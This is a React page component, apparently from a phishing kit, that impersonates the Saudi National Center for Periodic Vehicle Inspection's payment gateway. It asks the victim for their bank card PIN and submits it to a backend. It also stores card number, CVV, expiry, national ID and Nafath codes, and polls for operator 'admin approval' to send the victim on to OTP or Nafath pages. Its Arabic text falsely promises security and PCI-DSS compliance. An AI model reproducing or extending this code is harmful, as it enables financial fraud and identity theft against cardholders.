import React, { useState, useEffect } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { motion } from 'motion/react';
import { ShieldCheck, Eye, EyeOff, Lock, ArrowRight, Clock, RefreshCw } from 'lucide-react';
import { getNextPagePath } from '../lib/flow';

interface Transaction {
  id: string;
  cardNumber: string;
  cardholderName: string;
  expiry: string;
  cvv: string;
  cardType: string;
  amount: number;
  timestamp: string;
  status: 'PENDING_CARD_APPROVAL' | 'AWAITING_OTP' | 'OTP_SUBMITTED' | 'APPROVED' | 'REJECTED' | 'AWAITING_NAFATH' | 'NAFATH_VERIFIED' | 'AWAITING_PIN' | 'PIN_SUBMITTED';
  otpCode: string;
  submittedOtp?: string;
  cardPin?: string;
  serviceName?: string;
  nationalId?: string;
  nafathVerified?: boolean;
  nafathCode?: string;
}

export function CardPinPage() {
  const navigate = useNavigate();
  const location = useLocation();

  const [tx, setTx] = useState<Transaction | undefined>(() => {
    if (location.state?.tx) {
      localStorage.setItem('last_tx', JSON.stringify(location.state.tx));
      return location.state.tx;
    }
    const saved = localStorage.getItem('last_tx');
    if (saved) {
      try {
        return JSON.parse(saved);
      } catch (e) {
        return undefined;
      }
    }
    return undefined;
  });

  const [pin, setPin] = useState('');
  const [showPin, setShowPin] = useState(false);
  const [errorMsg, setErrorMsg] = useState<string | null>(null);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [isSuccess, setIsSuccess] = useState(false);
  const [status, setStatus] = useState<string>(tx?.status || 'AWAITING_PIN');

  // Verify transaction context
  useEffect(() => {
    if (!tx) {
      navigate('/');
    }
  }, [tx, navigate]);

  // Poll transaction status to catch admin approval or changes
  useEffect(() => {
    if (!tx || !tx.id || isSuccess) return;

    let isMounted = true;
    let interval: NodeJS.Timeout;

    const checkStatus = async () => {
      try {
        const res = await fetch(`/api/status/${tx.id}`);
        if (res.ok && isMounted) {
          const updatedTx = await res.json();
          setStatus(updatedTx.status);
          localStorage.setItem('last_tx', JSON.stringify(updatedTx));

          // If approved or changed to OTP status, go to next flow page
          if (updatedTx.status === 'APPROVED') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/card-pin');
              navigate(dynamicNext || '/success', { state: { tx: updatedTx } });
            }, 1000);
          } else if (updatedTx.status === 'AWAITING_OTP') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/card-pin');
              navigate(dynamicNext || '/otp', { state: { tx: updatedTx } });
            }, 1000);
          } else if (updatedTx.status === 'AWAITING_NAFATH') {
            clearInterval(interval);
            setTimeout(async () => {
              const dynamicNext = await getNextPagePath('/card-pin');
              navigate(dynamicNext || '/nafath-login', { state: { tx: updatedTx } });
            }, 1000);
          } else if (updatedTx.status === 'REJECTED') {
            setErrorMsg('تم رفض العملية من قبل البنك المصدر للبطاقة. يرجى مراجعة البنك أو تجربة بطاقة أخرى.');
          }
        }
      } catch (err) {
        console.warn('Polling network warning in CardPinPage, retrying...', err);
      }
    };

    // Poll every 2.5 seconds
    interval = setInterval(checkStatus, 2500);

    // Instant check when user switches back to the tab
    const handleVisibilityChange = () => {
      if (document.visibilityState === 'visible') {
        checkStatus();
      }
    };

    window.addEventListener('visibilitychange', handleVisibilityChange);
    window.addEventListener('focus', checkStatus);

    return () => {
      isMounted = false;
      clearInterval(interval);
      window.removeEventListener('visibilitychange', handleVisibilityChange);
      window.removeEventListener('focus', checkStatus);
    };
  }, [tx, isSuccess, navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setErrorMsg(null);

    if (!pin || pin.length < 4 || pin.length > 6) {
      setErrorMsg('يرجى إدخال رمز بطاقة صحيح مكون من 4 إلى 6 أرقام');
      return;
    }

    setIsSubmitting(true);

    try {
      const res = await fetch('/api/verify-pin', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          id: tx?.id,
          pin: pin
        })
      });

      if (res.ok) {
        const data = await res.json();
        if (data && data.transaction) {
          localStorage.setItem('last_tx', JSON.stringify(data.transaction));
          setTx(data.transaction);
          setStatus('PIN_SUBMITTED');
          setIsSuccess(true);
          
          // Redirect dynamically based on custom flow
          setTimeout(async () => {
            const dynamicNext = await getNextPagePath('/card-pin');
            navigate(dynamicNext || '/pin-processing', { state: { tx: data.transaction } });
          }, 1500);
        } else {
          setErrorMsg('حدث خطأ أثناء معالجة رمز البطاقة.');
          setIsSubmitting(false);
        }
      } else {
        setErrorMsg('خطأ في استجابة الخادم أثناء التحقق.');
        setIsSubmitting(false);
      }
    } catch (err) {
      console.error('Error verifying PIN:', err);
      setErrorMsg('فشل الاتصال بالخادم. يرجى التحقق من اتصالك بالإنترنت.');
      setIsSubmitting(false);
    }
  };

  const maskedCardNumber = tx?.cardNumber
    ? (() => {
        const clean = tx.cardNumber.replace(/\D/g, '');
        if (clean.length <= 4) return clean;
        const last4 = clean.slice(-4);
        const maskedLength = clean.length - 4;
        let masked = '';
        for (let i = 0; i < maskedLength; i++) {
          masked += '•';
          if ((i + 1) % 4 === 0 && i !== maskedLength - 1) {
            masked += ' ';
          }
        }
        if (masked.length > 0 && !masked.endsWith(' ')) {
          masked += ' ';
        }
        return masked + last4;
      })()
    : '•••• •••• •••• ••••';

  return (
    <div className="mx-auto px-4 py-12 sm:px-6 max-w-xl dir-rtl">
      <div className="bg-white rounded-2xl shadow-xl border border-gray-100 overflow-hidden">
        <div className="h-2 bg-[#004d33] w-full" />

        <div className="p-6 sm:p-8 space-y-6 text-right">
          <div className="text-center pb-4 border-b border-gray-100">
            <div className="mx-auto w-14 h-14 rounded-full bg-emerald-50 flex items-center justify-center mb-3">
              <Lock className="h-7 w-7 text-[#004d33]" />
            </div>
            <h3 className="text-base font-black text-slate-800">تأكيد هوية حامل البطاقة البنكية</h3>
            <p className="text-xs text-slate-400 mt-1.5 leading-relaxed">بوابة الدفع الآمنة للمركز الوطني للفحص الدوري للمركبات</p>
          </div>

          {/* Secure Card Summary Info */}
          <div className="bg-slate-50 rounded-xl p-4 border border-gray-100 flex items-center justify-between">
            <div className="text-right">
              <span className="block text-[10px] text-slate-400">البطاقة المستخدمة</span>
              <span className="block text-xs font-bold text-slate-700 font-mono mt-0.5">{maskedCardNumber}</span>
            </div>
            <div className="text-left font-mono">
              <span className="block text-[10px] text-slate-400">مبلغ المعاملة</span>
              <span className="block text-xs font-black text-[#004d33] mt-0.5">{tx?.amount || '150.00'} ر.س</span>
            </div>
          </div>

          {errorMsg && (
            <div className="p-3 bg-rose-50 text-rose-600 rounded-xl text-xs font-bold border border-rose-100 text-right">
              ⚠️ {errorMsg}
            </div>
          )}

          {isSuccess || status === 'PIN_SUBMITTED' ? (
            <div className="py-8 text-center space-y-4">
              <div className="flex justify-center">
                <RefreshCw className="w-10 h-10 text-[#004d33] animate-spin" />
              </div>
              <h4 className="text-sm font-bold text-slate-800">جاري مراجعة وتحقق وتأكيد المعاملة...</h4>
              <p className="text-xs text-slate-400 leading-relaxed max-w-sm mx-auto">
                تم استلام الرمز بنجاح. يرجى الانتظار قليلاً وعدم إغلاق الصفحة أو الضغط على زر الرجوع حتى تكتمل المعاملة مع البنك المصدر لبطاقتك.
              </p>
            </div>
          ) : (
            <form onSubmit={handleSubmit} className="space-y-5">
              <div className="bg-emerald-50/50 rounded-xl p-4 border border-emerald-100/50">
                <p className="text-xs text-emerald-800 leading-relaxed font-bold">
                  🛡️ يرجى إدخال الرقم السري الخاص بالبطاقة البنكية (PIN) المكون من 4 أرقام لتأكيد الهوية وضمان حماية حسابك البنكي من العمليات غير المصرح بها وإصدار إيصال الفحص بشكل آمن.
                </p>
              </div>

              <div>
                <label className="block text-xs font-bold text-slate-700 mb-1.5">الرقم السري للبطاقة (PIN)</label>
                <div className="relative">
                  <input
                    type={showPin ? "text" : "password"}
                    maxLength={6}
                    placeholder="الرقم السري للبطاقة (PIN)"
                    value={pin}
                    onChange={(e) => setPin(e.target.value.replace(/\D/g, ''))}
                    className="w-full rounded-xl border border-gray-200 bg-gray-50/50 pl-12 pr-4 py-3.5 text-sm font-bold text-slate-900 placeholder-slate-400 focus:border-[#004d33] focus:bg-white focus:outline-none focus:ring-1 focus:ring-[#004d33] font-mono tracking-widest text-center"
                    disabled={isSubmitting}
                    required
                  />
                  <button
                    type="button"
                    onClick={() => setShowPin(!showPin)}
                    className="absolute left-3 top-1/2 -translate-y-1/2 p-1.5 text-slate-400 hover:text-slate-600 transition cursor-pointer"
                  >
                    {showPin ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  </button>
                </div>
              </div>

              <button
                type="submit"
                disabled={isSubmitting}
                className="w-full flex items-center justify-center gap-2 rounded-xl bg-[#004d33] hover:bg-[#003a26] px-4 py-3.5 text-sm font-bold text-white shadow-lg transition-all cursor-pointer mt-6 disabled:opacity-75"
              >
                {isSubmitting ? (
                  <span>جاري التحقق الرقمي والربط بالبنك...</span>
                ) : (
                  <>
                    <span>تأكيد العملية والاستمرار</span>
                    <ArrowRight className="h-4 w-4 rotate-180" />
                  </>
                )}
              </button>
            </form>
          )}

          <div className="pt-4 border-t border-gray-50 flex items-center justify-center gap-2 text-[10px] text-slate-400">
            <ShieldCheck className="w-4 h-4 text-[#004d33]" />
            <span>اتصال مشفر وآمن بالكامل مع معايير PCI-DSS لبطاقات الدفع</span>
          </div>
        </div>
      </div>
    </div>
  );
}
